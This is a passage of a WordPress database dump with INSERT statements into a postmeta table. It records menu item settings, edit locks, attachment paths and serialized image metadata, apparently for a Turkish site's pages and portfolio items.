INSERT INTO `cmrfu_postmeta` VALUES("1305","779","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1306","780","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1307","780","_menu_item_menu_item_parent","12");
INSERT INTO `cmrfu_postmeta` VALUES("1308","780","_menu_item_object_id","300");
INSERT INTO `cmrfu_postmeta` VALUES("1309","780","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1310","780","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1311","780","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1312","780","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1313","780","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1314","781","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1315","781","_menu_item_menu_item_parent","12");
INSERT INTO `cmrfu_postmeta` VALUES("1316","781","_menu_item_object_id","297");
INSERT INTO `cmrfu_postmeta` VALUES("1317","781","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1318","781","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1319","781","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1320","781","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1321","781","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1322","782","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1323","782","_menu_item_menu_item_parent","12");
INSERT INTO `cmrfu_postmeta` VALUES("1324","782","_menu_item_object_id","248");
INSERT INTO `cmrfu_postmeta` VALUES("1325","782","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1326","782","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1327","782","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1328","782","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1329","782","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1330","783","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1331","783","_menu_item_menu_item_parent","12");
INSERT INTO `cmrfu_postmeta` VALUES("1332","783","_menu_item_object_id","256");
INSERT INTO `cmrfu_postmeta` VALUES("1333","783","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1334","783","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1335","783","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1336","783","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1337","783","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1338","784","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1339","784","_menu_item_menu_item_parent","12");
INSERT INTO `cmrfu_postmeta` VALUES("1340","784","_menu_item_object_id","264");
INSERT INTO `cmrfu_postmeta` VALUES("1341","784","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1342","784","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1343","784","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1344","784","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1345","784","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1346","785","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1347","785","_menu_item_menu_item_parent","12");
INSERT INTO `cmrfu_postmeta` VALUES("1348","785","_menu_item_object_id","379");
INSERT INTO `cmrfu_postmeta` VALUES("1349","785","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1350","785","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1351","785","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1352","785","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1353","785","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1354","786","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1355","786","_menu_item_menu_item_parent","13");
INSERT INTO `cmrfu_postmeta` VALUES("1356","786","_menu_item_object_id","497");
INSERT INTO `cmrfu_postmeta` VALUES("1357","786","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1358","786","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1359","786","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1360","786","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1361","786","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1362","787","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1363","787","_menu_item_menu_item_parent","13");
INSERT INTO `cmrfu_postmeta` VALUES("1364","787","_menu_item_object_id","517");
INSERT INTO `cmrfu_postmeta` VALUES("1365","787","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1366","787","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1367","787","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1368","787","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1369","787","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1370","788","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1371","788","_menu_item_menu_item_parent","13");
INSERT INTO `cmrfu_postmeta` VALUES("1372","788","_menu_item_object_id","671");
INSERT INTO `cmrfu_postmeta` VALUES("1373","788","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1374","788","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1375","788","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1376","788","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1377","788","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1378","789","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1379","789","_menu_item_menu_item_parent","788");
INSERT INTO `cmrfu_postmeta` VALUES("1380","789","_menu_item_object_id","678");
INSERT INTO `cmrfu_postmeta` VALUES("1381","789","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1382","789","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1383","789","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1384","789","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1385","789","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1386","790","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1387","790","_menu_item_menu_item_parent","788");
INSERT INTO `cmrfu_postmeta` VALUES("1388","790","_menu_item_object_id","674");
INSERT INTO `cmrfu_postmeta` VALUES("1389","790","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1390","790","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1391","790","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1392","790","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1393","790","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1394","791","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1395","791","_menu_item_menu_item_parent","788");
INSERT INTO `cmrfu_postmeta` VALUES("1396","791","_menu_item_object_id","676");
INSERT INTO `cmrfu_postmeta` VALUES("1397","791","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1398","791","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1399","791","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1400","791","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1401","791","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1402","792","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1403","792","_menu_item_menu_item_parent","14");
INSERT INTO `cmrfu_postmeta` VALUES("1404","792","_menu_item_object_id","647");
INSERT INTO `cmrfu_postmeta` VALUES("1405","792","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1406","792","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1407","792","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1408","792","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1409","792","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1410","793","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1411","793","_menu_item_menu_item_parent","14");
INSERT INTO `cmrfu_postmeta` VALUES("1412","793","_menu_item_object_id","649");
INSERT INTO `cmrfu_postmeta` VALUES("1413","793","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1414","793","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1415","793","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1416","793","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1417","793","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1418","794","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1419","794","_menu_item_menu_item_parent","14");
INSERT INTO `cmrfu_postmeta` VALUES("1420","794","_menu_item_object_id","655");
INSERT INTO `cmrfu_postmeta` VALUES("1421","794","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1422","794","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1423","794","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1424","794","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1425","794","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1426","795","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1427","795","_menu_item_menu_item_parent","794");
INSERT INTO `cmrfu_postmeta` VALUES("1428","795","_menu_item_object_id","651");
INSERT INTO `cmrfu_postmeta` VALUES("1429","795","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1430","795","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1431","795","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1432","795","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1433","795","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1434","796","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1435","796","_menu_item_menu_item_parent","794");
INSERT INTO `cmrfu_postmeta` VALUES("1436","796","_menu_item_object_id","653");
INSERT INTO `cmrfu_postmeta` VALUES("1437","796","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1438","796","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1439","796","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1440","796","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1441","796","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1442","797","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1443","797","_menu_item_menu_item_parent","14");
INSERT INTO `cmrfu_postmeta` VALUES("1444","797","_menu_item_object_id","186");
INSERT INTO `cmrfu_postmeta` VALUES("1445","797","_menu_item_object","portfolio");
INSERT INTO `cmrfu_postmeta` VALUES("1446","797","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1447","797","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1448","797","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1449","797","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1450","798","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1451","798","_menu_item_menu_item_parent","0");
INSERT INTO `cmrfu_postmeta` VALUES("1452","798","_menu_item_object_id","454");
INSERT INTO `cmrfu_postmeta` VALUES("1453","798","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1454","798","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1455","798","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1456","798","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1457","798","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1458","799","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1459","799","_menu_item_menu_item_parent","798");
INSERT INTO `cmrfu_postmeta` VALUES("1460","799","_menu_item_object_id","473");
INSERT INTO `cmrfu_postmeta` VALUES("1461","799","_menu_item_object","post");
INSERT INTO `cmrfu_postmeta` VALUES("1462","799","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1463","799","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1464","799","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1465","799","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1466","800","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1467","800","_menu_item_menu_item_parent","0");
INSERT INTO `cmrfu_postmeta` VALUES("1468","800","_menu_item_object_id","447");
INSERT INTO `cmrfu_postmeta` VALUES("1469","800","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1470","800","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1471","800","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1472","800","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1473","800","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1474","801","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1475","801","_menu_item_menu_item_parent","759");
INSERT INTO `cmrfu_postmeta` VALUES("1476","801","_menu_item_object_id","708");
INSERT INTO `cmrfu_postmeta` VALUES("1477","801","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1478","801","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1479","801","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1480","801","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1481","801","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1897","924","_edit_lock","1489134232:1");
INSERT INTO `cmrfu_postmeta` VALUES("1891","921","_menu_item_custom","");
INSERT INTO `cmrfu_postmeta` VALUES("1896","924","er_leaf_revolutionslider","0");
INSERT INTO `cmrfu_postmeta` VALUES("1889","921","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1888","921","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1887","921","_menu_item_classes","a:1:{i:0;s:0:\"\";}");
INSERT INTO `cmrfu_postmeta` VALUES("1886","921","_menu_item_target","");
INSERT INTO `cmrfu_postmeta` VALUES("1885","921","_menu_item_object","page");
INSERT INTO `cmrfu_postmeta` VALUES("1988","946","er_leaf_page_heading","1");
INSERT INTO `cmrfu_postmeta` VALUES("1977","944","er_leaf_page_heading","1");
INSERT INTO `cmrfu_postmeta` VALUES("2262","1061","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1866","915","_menu_item_xfn","");
INSERT INTO `cmrfu_postmeta` VALUES("1867","915","_menu_item_url","");
INSERT INTO `cmrfu_postmeta` VALUES("1860","915","_menu_item_type","post_type");
INSERT INTO `cmrfu_postmeta` VALUES("1898","924","_format_audio_embed","");
INSERT INTO `cmrfu_postmeta` VALUES("1892","454","_edit_lock","1401708094:1");
INSERT INTO `cmrfu_postmeta` VALUES("1537","715","_menu_item_custom","");
INSERT INTO `cmrfu_postmeta` VALUES("1641","186","_thumbnail_id","1055");
INSERT INTO `cmrfu_postmeta` VALUES("1550","186","_edit_lock","1479849397:1");
INSERT INTO `cmrfu_postmeta` VALUES("2280","1065","_wp_attached_file","2016/11/mid2.png");
INSERT INTO `cmrfu_postmeta` VALUES("2295","1076","_wp_attached_file","2014/08/misya-sertifika-001.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2261","447","_yoast_wpseo_content_score","60");
INSERT INTO `cmrfu_postmeta` VALUES("1553","805","_wp_attached_file","2014/02/bright_squares.png");
INSERT INTO `cmrfu_postmeta` VALUES("1554","805","_wp_attachment_metadata","a:5:{s:5:\"width\";i:297;s:6:\"height\";i:297;s:4:\"file\";s:26:\"2014/02/bright_squares.png\";s:5:\"sizes\";a:4:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:26:\"bright_squares-150x150.png\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:9:\"image/png\";}s:4:\"post\";a:4:{s:4:\"file\";s:26:\"bright_squares-297x230.png\";s:5:\"width\";i:297;s:6:\"height\";i:230;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:26:\"bright_squares-170x105.png\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:24:\"bright_squares-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("2282","1066","_wp_attached_file","2016/11/mid3.png");
INSERT INTO `cmrfu_postmeta` VALUES("2283","1066","_wp_attachment_metadata","a:5:{s:5:\"width\";i:960;s:6:\"height\";i:350;s:4:\"file\";s:16:\"2016/11/mid3.png\";s:5:\"sizes\";a:7:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:16:\"mid3-150x150.png\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:9:\"image/png\";}s:6:\"medium\";a:4:{s:4:\"file\";s:16:\"mid3-300x109.png\";s:5:\"width\";i:300;s:6:\"height\";i:109;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"medium_large\";a:4:{s:4:\"file\";s:16:\"mid3-768x280.png\";s:5:\"width\";i:768;s:6:\"height\";i:280;s:9:\"mime-type\";s:9:\"image/png\";}s:4:\"post\";a:4:{s:4:\"file\";s:16:\"mid3-770x230.png\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:9:\"image/png\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:16:\"mid3-450x350.png\";s:5:\"width\";i:450;s:6:\"height\";i:350;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:16:\"mid3-170x105.png\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:14:\"mid3-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:1:\"0\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"0\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2281","1065","_wp_attachment_metadata","a:5:{s:5:\"width\";i:960;s:6:\"height\";i:350;s:4:\"file\";s:16:\"2016/11/mid2.png\";s:5:\"sizes\";a:7:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:16:\"mid2-150x150.png\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:9:\"image/png\";}s:6:\"medium\";a:4:{s:4:\"file\";s:16:\"mid2-300x109.png\";s:5:\"width\";i:300;s:6:\"height\";i:109;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"medium_large\";a:4:{s:4:\"file\";s:16:\"mid2-768x280.png\";s:5:\"width\";i:768;s:6:\"height\";i:280;s:9:\"mime-type\";s:9:\"image/png\";}s:4:\"post\";a:4:{s:4:\"file\";s:16:\"mid2-770x230.png\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:9:\"image/png\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:16:\"mid2-450x350.png\";s:5:\"width\";i:450;s:6:\"height\";i:350;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:16:\"mid2-170x105.png\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:14:\"mid2-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:1:\"0\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"0\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("1634","817","_wp_attached_file","2013/10/nophoto.png");
INSERT INTO `cmrfu_postmeta` VALUES("1635","817","_wp_attachment_metadata","a:5:{s:5:\"width\";i:680;s:6:\"height\";i:480;s:4:\"file\";s:19:\"2013/10/nophoto.png\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:19:\"nophoto-150x150.png\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:9:\"image/png\";}s:6:\"medium\";a:4:{s:4:\"file\";s:19:\"nophoto-300x211.png\";s:5:\"width\";i:300;s:6:\"height\";i:211;s:9:\"mime-type\";s:9:\"image/png\";}s:4:\"post\";a:4:{s:4:\"file\";s:19:\"nophoto-680x230.png\";s:5:\"width\";i:680;s:6:\"height\";i:230;s:9:\"mime-type\";s:9:\"image/png\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:19:\"nophoto-450x480.png\";s:5:\"width\";i:450;s:6:\"height\";i:480;s:9:\"mime-type\";s:9:\"image/png\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:19:\"nophoto-170x105.png\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:9:\"image/png\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:17:\"nophoto-85x85.png\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:9:\"image/png\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1636","447","_edit_lock","1479856208:1");
INSERT INTO `cmrfu_postmeta` VALUES("2207","1055","_wp_attachment_metadata","a:5:{s:5:\"width\";i:500;s:6:\"height\";i:500;s:4:\"file\";s:21:\"2013/10/urunler_1.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:21:\"urunler_1-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:21:\"urunler_1-300x300.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:21:\"urunler_1-500x230.jpg\";s:5:\"width\";i:500;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:21:\"urunler_1-450x500.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:500;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:21:\"urunler_1-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:19:\"urunler_1-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:1:\"0\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"1\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2206","1055","_wp_attached_file","2013/10/urunler_1.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1667","186","_wp_old_slug","happy-house");
INSERT INTO `cmrfu_postmeta` VALUES("2215","184","_yoast_wpseo_primary_portfolio_category","");
INSERT INTO `cmrfu_postmeta` VALUES("2214","184","_wp_old_slug","alpay-konak-kat-3");
INSERT INTO `cmrfu_postmeta` VALUES("1698","184","_wp_old_slug","facilisis-laoreet");
INSERT INTO `cmrfu_postmeta` VALUES("2219","182","_wp_old_slug","hervenik-apartman-daire-4");
INSERT INTO `cmrfu_postmeta` VALUES("2220","182","_yoast_wpseo_primary_portfolio_category","");
INSERT INTO `cmrfu_postmeta` VALUES("1714","182","_wp_old_slug","blue-tower");
INSERT INTO `cmrfu_postmeta` VALUES("1715","177","_edit_lock","1479850180:1");
INSERT INTO `cmrfu_postmeta` VALUES("2222","1059","_wp_attached_file","2013/10/urunler_4.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2223","1059","_wp_attachment_metadata","a:5:{s:5:\"width\";i:500;s:6:\"height\";i:500;s:4:\"file\";s:21:\"2013/10/urunler_4.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:21:\"urunler_4-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:21:\"urunler_4-300x300.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:21:\"urunler_4-500x230.jpg\";s:5:\"width\";i:500;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:21:\"urunler_4-450x500.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:500;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:21:\"urunler_4-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:19:\"urunler_4-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:1:\"0\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"1\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("1730","177","_wp_old_slug","vancee-hometown");
